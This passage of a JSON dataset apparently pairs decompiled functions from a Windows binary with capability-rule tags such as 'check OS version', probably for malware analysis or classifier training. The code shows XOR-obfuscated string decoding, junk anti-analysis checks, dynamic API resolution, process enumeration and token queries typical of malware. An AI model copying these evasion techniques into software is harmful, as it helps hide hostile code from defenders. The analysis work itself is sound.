(*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_ch);\n    (*pcVar6)(uVar2);\n    return uVar7;\n}\n",
        "token_count": 1191
    },
    "00406750": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00406750(uint param_1)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    code *pcVar9;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar7 = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_18h = 0;\n    iVar2 = fcn.00406208(&var_8h);\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.SHLWAPI.dll_StrDupW)(param_1);\n        var_14h = iVar2;\n        var_10h = fcn.0040494b();\n        pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (var_10h != 0) {\n            var_2ch = 0x7711597a;\n            var_28h = 0x783f5429;\n            var_24h._0_2_ = 0x4777;\n            var_20h = 0x77785954;\n            var_1ch._0_1_ = 0x47;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar8 = iVar7;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n                iVar2 = var_14h;\n                iVar7 = var_18h;\n                if (iVar5 != 0x5d19dd) {\n                    var_ch = 5;\n                    *(iVar8 + piVar4) = *(&var_20h + iVar8 % 5) ^ (iVar8 + piVar4)[&var_2ch - piVar4];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 10);\n            piVar6 = piVar4;\n            do {\n                iVar1 = *piVar6;\n                *((var_10h - piVar4) + piVar6) = iVar1;\n                pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        iVar8 = fcn.00403b78(var_8h);\n        if (iVar8 == 0) {\n            iVar8 = fcn.00406314();\n            if (iVar8 != 0) {\n                iVar7 = 1;\n            }\n        }\n        if (iVar2 != 0) {\n            uVar3 = (*pcVar9)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        uVar3 = (*pcVar9)(0, var_4h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar7;\n}\n",
        "token_count": 822
    },
    "004073b8": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004073b8(code *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint uVar8;\n    uint uVar9;\n    int32_t *piVar10;\n    int32_t iVar11;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    code *var_1ch;\n    uint var_18h;\n    int32_t *lpLibFileName;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0xffffffff;\n    var_1ch = param_1;\n    var_18h = param_2;\n    if (*0x41cb14 == NULL) {\n        var_30h = 0xf034404;\n        var_2ch = 0x5c0e6655;\n        var_28h._0_2_ = 0x630b;\n        var_24h = 0x6367306a;\n        var_20h._0_2_ = 0x4839;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_8h = 6;\n        iVar11 = 0;\n        lpLibFileName = iVar4;\n        do {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n            if (iVar5 != 0xea05b6) {\n                *(iVar11 + iVar4) = *(&var_24h + iVar11 % var_8h) ^ (iVar11 + iVar4)[&var_30h - iVar4];\n            }\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 10);\n        var_4ch = 0x451e0004;\n        var_48h = 0x2733033c;\n        var_44h = 0x142d4336;\n        var_40h = 0x56213d27;\n        var_3ch = 0x15270336;\n        var_38h = 0x1f36593b;\n        var_34h._0_1_ = 0x4a;\n        var_24h = 0x304f744a;\n        var_20h._0_2_ = 0x7159;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar11 = 0;\n        var_10h = &var_4ch - iVar4;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetInputState)();\n            iVar5 = lpLibFileName;\n            if (iVar6 != 0x76d3f2) {\n                *(iVar11 + iVar4) = *(&var_24h + iVar11 % var_8h) ^ (iVar11 + iVar4)[&var_4ch - iVar4];\n            }\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 0x19);\n        uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar4);\n        *0x41cb14 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar5);\n        (*pcVar1)(uVar3);\n    }\n    var_4h = 0;\n    iVar4 = (**0x41cb14)(5, 0, 0, &var_4h);\n    if (iVar4 == -0x3ffffffc) {\n        var_4h = var_4h + 0x100;\n        piVar7 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_4h, 0x3000, 4);\n        if (piVar7 != NULL) {\n            lpLibFileName = piVar7;\n            iVar4 = (**0x41cb14)(5, piVar7, var_4h, 0);\n            uVar3 = var_18h;\n            piVar10 = piVar7;\n            if (-1 < iVar4) {\n                var_ch = 0;\n                do {\n                    iVar4 = piVar7[0x11];\n                    if (((iVar4 != 0) && (iVar4 != 4)) && (iVar4 != *0x41cb30)) {\n                        uVar8 = fcn.00404b24();\n                        uVar9 = fcn.0040af81();\n                        iVar4 = (*var_1ch)(piVar7[0xf], uVar9, piVar7[0x11], piVar7[0x12], uVar8, uVar3);\n                        piVar10 = lpLibFileName;\n                        if (iVar4 == 0) break;\n                    }\n                    piVar10 = lpLibFileName;\n                    if (*piVar7 == 0) break;\n                    piVar7 = piVar7 + *piVar7;\n                } while( true );\n            }\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(piVar10, 0, 0x8000);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 1378
    },
    "004075db": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004075db(uint param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uchar *var_28h;\n    code *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint hObject;\n    int32_t lpLibFileName;\n    uint dwBytes;\n    \n    iVar7 = 0;\n    var_4ch._0_1_ = 4;\n    var_4ch._1_1_ = 0x44;\n    var_4ch._2_1_ = 3;\n    var_4ch._3_1_ = 0xf;\n    puVar9 = &var_70h;\n    var_28h = param_2;\n    for (iVar6 = 0x18; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_40h = *0x41cb30;\n    var_3ch = 0;\n    dwBytes = 0;\n    var_20h = 0;\n    var_48h._0_1_ = 0x55;\n    var_48h._1_1_ = 0x66;\n    var_48h._2_1_ = 0xe;\n    var_48h._3_1_ = 0x5c;\n    var_44h._0_1_ = 0xb;\n    var_44h._1_1_ = 99;\n    var_38h = 0x6367306a;\n    var_34h._0_2_ = 0x4839;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_14h = 6;\n    lpLibFileName = iVar6;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar3 != 0xea05b6) {\n            *(iVar7 + iVar6) = *(&var_38h + iVar7 % var_14h) ^ (iVar7 + iVar6)[&var_4ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_50h = 0x425390f;\n    var_4ch._0_1_ = 8;\n    var_4ch._1_1_ = 0x1c;\n    var_18h = 0x5;\n    var_4ch._2_1_ = 5;\n    var_4ch._3_1_ = 0x3c;\n    var_48h._1_1_ = 0x17;\n    var_48h._2_1_ = 8;\n    var_48h._3_1_ = 1;\n    var_44h._0_1_ = 0x26;\n    var_44h._1_1_ = 0x4e;\n    var_38h = 0x746a4e55;\n    var_34h._0_2_ = 0x726d;\n    var_48h._0_1_ = var_4ch._2_1_;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    var_30h = iVar6;\n    var_24h = &var_50h - iVar6;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0x51519) {\n            *(iVar7 + iVar6) = *(&var_38h + iVar7 % var_14h) ^ (&var_50h - iVar6)[iVar7 + iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xe);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    var_70h = 0x18;\n    var_6ch = 0;\n    var_64h = 0;\n    var_68h = 0;\n    var_60h = 0;\n    var_5ch = 0;\n    iVar7 = (*pcVar5)(&var_1ch, 0x400, &var_70h, &var_40h);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (-1 < iVar7) {\n        var_54h = 0x1c034f2b;\n        var_50h = 0x3e681f03;\n        var_4ch._0_1_ = 3;\n        var_4ch._1_1_ = 5;\n        var_4ch._2_1_ = 0x14;\n        var_4ch._3_1_ = 0x4b;\n        var_48h._0_1_ = 0x3f;\n        var_48h._1_1_ = 0x38;\n        var_48h._2_1_ = 9;\n        var_48h._3_1_ = 0x1a;\n        var_44h._0_1_ = 0x5d;\n        var_44h._1_1_ = 0x22;\n        var_44h._2_1_ = 0x6c;\n        var_14h = 0x6c4c3871;\n        var_10h._0_1_ = 0x66;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_2ch = iVar6;\n        var_24h = &var_54h - iVar6;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            iVar3 = lpLibFileName;\n            if (iVar4 != 0x6eea37) {\n                *(iVar7 + iVar6) = *(&var_14h + iVar7 % var_18h) ^ (&var_54h - iVar6)[iVar7 + iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x13);\n        uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n        pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        iVar7 = (*pcVar5)(var_1ch, 8, &hObject);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (-1 < iVar7) {\n            var_58h = 0x2710010f;\n            var_54h = 0x80f2750;\n            var_50h = 0x43a533c;\n            var_4ch._0_1_ = 0x2c;\n            var_4ch._1_1_ = 0x33;\n            var_4ch._2_1_ = 0x41;\n            var_4ch._3_1_ = 0x3c;\n            var_48h._0_1_ = 0x19;\n            var_48h._1_1_ = 0x2f;\n            var_48h._2_1_ = 6;\n            var_48h._3_1_ = 0x5a;\n            var_44h._0_1_ = 0x3e;\n            var_44h._1_1_ = 0x13;\n            var_44h._2_1_ = 0x2f;\n            var_44h._3_1_ = 0x52;\n            var_38h = 0x52417655;\n            var_34h._0_2_ = CONCAT11(var_34h._1_1_, 0x35);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar7 = 0;\n            var_24h = &var_58h - iVar6;\n            var_14h = iVar6;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n                iVar3 = lpLibFileName;\n                if (iVar4 != 0x28504b) {\n                    *(iVar7 + iVar6) = *(&var_38h + iVar7 % var_18h) ^ (iVar7 + iVar6)[&var_58h - iVar6];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x18);\n            uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n            var_24h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n            (*var_24h)(hObject, 1, 0, 0, &dwBytes);\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes);\n            var_18h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (var_18h != NULL) {\n                iVar7 = (*var_24h)(hObject, 1, var_18h, dwBytes, &dwBytes);\n                if (-1 < iVar7) {\n                    puVar8 = *var_18h;\n                    puVar10 = var_28h;\n                    for (iVar6 = 0x1c; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar10 = *puVar8;\n                        puVar8 = puVar8 + 1;\n                        puVar10 = puVar10 + 1;\n                    }\n                    var_20h = 1;\n                    iVar6 = var_14h;\n                    iVar3 = lpLibFileName;\n                }\n                uVar2 = (*pcVar5)(0, var_18h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            uVar2 = (*pcVar5)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            iVar6 = var_2ch;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_1ch);\n        uVar2 = (*pcVar5)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        iVar6 = var_30h;\n    }\n    uVar2 = (*pcVar5)(0, iVar6);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar5)(0, iVar3);\n    (*pcVar1)(uVar2);\n    return var_20h;\n}\n",
        "token_count": 2802
    },
    "00409c14": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00409c14(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpModuleName;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_28h = 0xf034404;\n    var_24h = 0x5c0e6655;\n    var_20h._0_2_ = 0x630b;\n    var_1ch = 0x6367306a;\n    var_18h._0_2_ = 0x4839;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_ch = &var_28h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar3 != 0xea05b6) {\n            var_8h = 6;\n            *(iVar7 + iVar2) = *(&var_1ch + iVar7 % 6) ^ (iVar7 + iVar2)[var_ch];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_40h = 0x29150410;\n    var_3ch = 0x1804111a;\n    var_38h = 0x24311b13;\n    var_34h = 0x31012316;\n    var_30h = 0x1150b35;\n    var_2ch._0_2_ = 0x7030;\n    var_8h = 0x67797042;\n    var_4h._0_1_ = 0x6e;\n    uVar1 = (*pcVar5)(8, 0x17);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_ch = &var_40h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0x7d8265) {\n            var_ch = 5;\n            *(iVar7 + iVar2) = *(&var_8h + iVar7 % 5) ^ (iVar7 + iVar2)[&var_40h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x16);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    uVar1 = (*pcVar5)(var_14h);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 880
    },
    "00409d4f": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00409d4f(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0xf034404;\n    var_20h = 0x5c0e6655;\n    var_1ch._0_1_ = 0xb;\n    var_1ch._1_1_ = 99;\n    var_18h = 0x6367306a;\n    var_14h._0_2_ = 0x4839;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 6;\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar3 != 0xea05b6) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_24h = 0x2a041f06;\n    var_20h = 0x4303955;\n    var_1ch._0_1_ = 5;\n    var_1ch._1_1_ = 0x78;\n    var_18h = 0x78686b54;\n    var_14h._0_2_ = 0x5734;\n    uVar1 = (*pcVar5)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetInputState)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0x17e128) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[&var_24h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    uVar1 = (*pcVar5)(var_10h);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 820
    },
    "00409e74": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00409e74(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint in_EDX;\n    int32_t iVar7;\n    uint *puVar8;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_10h = 0;\n    puVar8 = &var_28h;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_3ch = 0x33094408;\n    var_38h = 0x552f0f28;\n    var_34h = 0xa3e1d33;\n    var_30h = 0x3b305323;\n    var_2ch._0_2_ = 0x3737;\n    var_2ch._2_1_ = 0x46;\n    var_20h = 0x52443046;\n    var_1ch._0_2_ = 0x5958;\n    var_14h = in_EDX;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 6;\n    iVar7 = 0;\n    var_8h = &var_3ch - iVar6;\n    var_ch = iVar6;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        if (iVar2 != 0x2e086d) {\n            *(iVar7 + iVar6) = *(&var_20h + iVar7 % var_4h) ^ (iVar7 + iVar6)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x13);\n    var_34h = 0xf034404;\n    var_30h = 0x5c0e6655;\n    var_2ch._0_2_ = 0x630b;\n    var_20h = 0x6367306a;\n    var_1ch._0_2_ = 0x4839;\n    uVar1 = (*pcVar4)(8, 0xb);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_34h - iVar6;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        iVar2 = var_ch;\n        if (iVar3 != 0xea05b6) {\n            *(iVar7 + iVar6) = *(&var_20h + iVar7 % var_4h) ^ (iVar7 + iVar6)[&var_34h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar6, var_ch);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    (*pcVar4)(var_18h, var_14h, arg_8h, 0, 0, &var_28h, &var_10h, 2, 0, 0x40);\n    uVar1 = fcn.00409c14();\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    (*pcVar4)(uVar5);\n    return uVar1;\n}\n",
        "token_count": 1023
    },
    "00409fd6": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00409fd6(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpLibFileName;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_28h = 0xf034404;\n    var_24h = 0x5c0e6655;\n    var_20h._0_2_ = 0x630b;\n    var_1ch = 0x6367306a;\n    var_18h._0_2_ = 0x4839;\n    var_14h = param_2;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_ch = &var_28h - iVar2;\n    lpLibFileName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar3 != 0xea05b6) {\n            var_8h = 6;\n            *(iVar7 + iVar2) = *(&var_1ch + iVar7 % 6) ^ (iVar7 + iVar2)[var_ch];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_40h = 0x1b14317a;\n    var_3ch = 0x1735555d;\n    var_38h = 0xa43551c;\n    var_34h = 0x57552627;\n    var_30h = 0x5e1a2831;\n    var_2ch._0_1_ = 0x34;\n    var_8h = 0x75414534;\n    var_4h._0_1_ = 0x30;\n    uVar1 = (*pcVar5)(8, 0x16);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_ch = &var_40h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0x894871) {\n            var_ch = 5;\n            *(iVar7 + iVar2) = *(&var_8h + iVar7 % 5) ^ (iVar7 + iVar2)[&var_40h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x15);\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    (*pcVar5)(0xffffffff, var_14h);\n    uVar1 = fcn.00409c14();\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 914
    },
    "0040a118": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
